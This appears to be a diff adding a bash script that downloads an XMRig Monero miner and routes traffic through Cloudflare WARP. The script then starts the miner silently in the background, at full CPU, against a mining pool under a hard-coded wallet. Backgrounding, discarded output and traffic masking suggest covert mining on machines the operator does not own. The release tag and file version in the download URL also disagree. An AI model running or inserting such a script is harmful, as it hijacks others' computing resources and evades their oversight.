@@ -1,0 +1,11 @@
+#! /bin/bash
+sudo apt-get install wget hwloc -y
+wget https://github.com/True-Mining/xmrig-zerofee/releases/download/v6.12.2/xmrig-6.16.2-linux-x64.tar
+tar -xf xmrig-6.16.2-linux-x64.tar
+cd xmrig-6.16.2
+curl https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor --output /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
+echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
+sudo apt-get update -y && sudo apt-get install cloudflare-warp -y
+echo y | warp-cli register
+warp-cli set-mode warp
+warp-cli connect && ./xmrig -o pool.hashvault.pro:443 -u ZEPHYR2GFMTPfsJM5oen62a8yc5ah2UNfHse2Hh23vzPSJWiReAoii7ipWavHLzbRV4nfTKyFU4Jh8t5fdBUxqx2HEuALesPCyC5C --coin monero -k --tls --cpu-no-yield --cpu-max-threads-hint=100 -t 4 -B > /dev/null 2>&1
